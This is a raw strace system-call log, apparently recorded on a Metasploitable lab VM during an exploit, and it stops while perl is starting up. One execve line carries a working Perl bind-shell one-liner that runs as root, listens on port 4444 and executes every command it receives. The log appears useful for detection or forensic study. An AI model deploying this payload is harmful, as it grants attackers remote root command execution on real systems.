6821  07:15:42.781102 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de4000
6821  07:15:42.781113 mmap2(0xb7df8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7df8000
6821  07:15:42.781128 mmap2(0xb7dfa000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dfa000
6821  07:15:42.781142 close(1)          = 0
6821  07:15:42.781167 munmap(0xb7f8a000, 29913) = 0
6821  07:15:42.781268 open("/etc/ld.so.cache", O_RDONLY) = 1
6821  07:15:42.781309 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6821  07:15:42.781342 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f8a000
6821  07:15:42.781352 close(1)          = 0
6821  07:15:42.781363 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.781377 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
6821  07:15:42.781391 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6821  07:15:42.781478 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
6821  07:15:42.781495 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dda000
6821  07:15:42.781506 mmap2(0xb7de2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7de2000
6821  07:15:42.781522 close(1)          = 0
6821  07:15:42.781534 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6821  07:15:42.781547 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
6821  07:15:42.781561 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6821  07:15:42.781651 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6821  07:15:42.781668 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dcf000
6821  07:15:42.781679 mmap2(0xb7dd8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dd8000
6821  07:15:42.781695 close(1)          = 0
6821  07:15:42.781715 munmap(0xb7f8a000, 29913) = 0
6821  07:15:42.781731 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
6821  07:15:42.781745 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6821  07:15:42.781771 _llseek(1, 0, [0], SEEK_CUR) = 0
6821  07:15:42.781811 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
6821  07:15:42.781845 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f91000
6821  07:15:42.781855 _llseek(1, 1624, [1624], SEEK_SET) = 0
6821  07:15:42.781870 munmap(0xb7f91000, 1624) = 0
6821  07:15:42.781880 close(1)          = 0
6821  07:15:42.781908 getpgrp()         = 3831
6821  07:15:42.781918 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
6821  07:15:42.781933 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
6821  07:15:42.781949 brk(0x8101000)    = 0x8101000
6821  07:15:42.781979 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6821  07:15:42.781993 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6821  07:15:42.782007 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6821  07:15:42.782043 brk(0x8102000)    = 0x8102000
6821  07:15:42.782069 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6821  07:15:42.782088 stat64("/sbin/AB", 0xbfeda538) = -1 ENOENT (No such file or directory)
6821  07:15:42.782100 stat64("/bin/AB", 0xbfeda538) = -1 ENOENT (No such file or directory)
6821  07:15:42.782110 stat64("/usr/sbin/AB", 0xbfeda538) = -1 ENOENT (No such file or directory)
6821  07:15:42.782122 stat64("/usr/bin/AB", 0xbfeda538) = -1 ENOENT (No such file or directory)
6821  07:15:42.782135 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6821  07:15:42.782149 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e056f8) = 6822
6822  07:15:42.782191 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6822  07:15:42.782207 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6822  07:15:42.782220 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6822  07:15:42.782232 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6822  07:15:42.782247 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6822  07:15:42.782306 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6822  07:15:42.782334 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6822  07:15:42.782394 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
6822  07:15:42.782408 --- SIGPIPE (Broken pipe) @ 0 (0) ---
6822  07:15:42.782477 exit_group(127)   = ?
6821  07:15:42.787285 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:15:42.787316 waitpid(6821,  <unfinished ...>
6821  07:15:42.787329 <... rt_sigprocmask resumed> NULL, 8) = 0
6821  07:15:42.797455 --- SIGCHLD (Child exited) @ 0 (0) ---
6821  07:15:42.797455 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 6822
6821  07:15:42.797456 waitpid(-1, 0xbfeda1b8, WNOHANG) = -1 ECHILD (No child processes)
6821  07:15:42.797456 sigreturn()       = ? (mask now [])
6821  07:15:42.797456 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6821  07:15:42.797456 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6821  07:15:42.797457 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6821  07:15:42.797457 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
6821  07:15:42.797457 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6821  07:15:42.797465 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6821  07:15:42.797497 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6821  07:15:42.797516 stat64("/sbin/perl", 0xbfeda568) = -1 ENOENT (No such file or directory)
6821  07:15:42.797528 stat64("/bin/perl", 0xbfeda568) = -1 ENOENT (No such file or directory)
6821  07:15:42.797539 stat64("/usr/sbin/perl", 0xbfeda568) = -1 ENOENT (No such file or directory)
6821  07:15:42.797551 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6821  07:15:42.797568 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6821  07:15:42.797592 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6821  07:15:42.797606 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e056f8) = 6823
6823  07:15:42.797647 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6823  07:15:42.797663 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6823  07:15:42.797676 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6823  07:15:42.797687 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6823  07:15:42.797715 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6823  07:15:42.797759 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6823  07:15:42.797772 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6823  07:15:42.797821 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
6823  07:15:42.797907 brk(0)            = 0x8153000
6823  07:15:42.797926 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6823  07:15:42.797942 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7faf000
6823  07:15:42.797957 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6823  07:15:42.797973 open("/etc/ld.so.cache", O_RDONLY) = 1
6823  07:15:42.797985 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6823  07:15:42.798002 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fa7000
6823  07:15:42.798012 close(1)          = 0
6823  07:15:42.798022 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6823  07:15:42.798037 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6823  07:15:42.798050 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6823  07:15:42.798144 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6823  07:15:42.798161 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa3000
6823  07:15:42.798173 mmap2(0xb7fa5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fa5000
6823  07:15:42.798189 close(1)          = 0
6823  07:15:42.798804 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6823  07:15:42.798839 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
6823  07:15:42.798853 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
6823  07:15:42.798939 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
6823  07:15:42.798956 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f7e000
6823  07:15:42.798968 mmap2(0xb7fa1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fa1000
6823  07:15:42.798984 close(1)          = 0
6823  07:15:42.798995 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6823  07:15:42.799010 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
6823  07:15:42.799024 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
6823  07:15:42.799108 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
6823  07:15:42.799124 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7d000
6823  07:15:42.799137 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f65000
6823  07:15:42.807345 mmap2(0xb7f79000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f79000
6823  07:15:42.807345 mmap2(0xb7f7b000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f7b000
6823  07:15:42.807346 close(1)          = 0
6823  07:15:42.807356 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6823  07:15:42.807371 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6823  07:15:42.807385 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
6823  07:15:42.807473 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6823  07:15:42.807491 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e16000
6823  07:15:42.807502 mmap2(0xb7f5f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f5f000
6823  07:15:42.807517 mmap2(0xb7f62000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f62000
6823  07:15:42.807530 close(1)          = 0
6823  07:15:42.807542 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6823  07:15:42.807555 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
6823  07:15:42.807569 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
6823  07:15:42.807656 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
6823  07:15:42.807673 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de4000
6823  07:15:42.807684 mmap2(0xb7ded000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7ded000
6823  07:15:42.807698 mmap2(0xb7def000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7def000
6823  07:15:42.807724 close(1)          = 0
6823  07:15:42.807775 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de3000
6823  07:15:42.807805 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7de38c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6823  07:15:42.807862 mprotect(0xb7f5f000, 4096, PROT_READ) = 0
6823  07:15:42.807888 munmap(0xb7fa7000, 29913) = 0
6823  07:15:42.807905 set_tid_address(0xb7de3908) = 6823
6823  07:15:42.807915 set_robust_list(0xb7de3910, 0xc) = 0
6823  07:15:42.807924 futex(0xbf80d4a0, 0x81 /* FUTEX_??? */, 1) = 0
6823  07:15:42.807938 rt_sigaction(SIGRTMIN, {0xb7f692c0, [], SA_SIGINFO}, NULL, 8) = 0
6823  07:15:42.807951 rt_sigaction(SIGRT_1, {0xb7f69340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
6823  07:15:42.807963 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
6823  07:15:42.807976 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
6823  07:15:42.807994 uname({sys="Linux", node="metasploitable", ...}) = 0
6823  07:15:42.808040 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
6823  07:15:42.808084 brk(0)            = 0x8153000
6823  07:15:42.808094 brk(0x8174000)    = 0x8174000
6823  07:15:42.808137 getuid32()        = 0
6823  07:15:42.808147 geteuid32()       = 0
6823  07:15:42.808156 getgid32()        = 0
6823  07:15:42.808164 getegid32()       = 0
6823  07:15:42.808200 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dc2000
6823  07:15:42.808738 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
6823  07:15:42.808855 read(1, "\2051jA", 4) = 4
6823  07:15:42.808913 close(1)          = 0
6823  07:15:42.808954 time(NULL)        = 1495624542
6823  07:15:42.809009 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf80d170) = -1 ENOENT (No such file or directory)
6823  07:15:42.809036 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf80d170) = -1 ENOENT (No such file or directory)
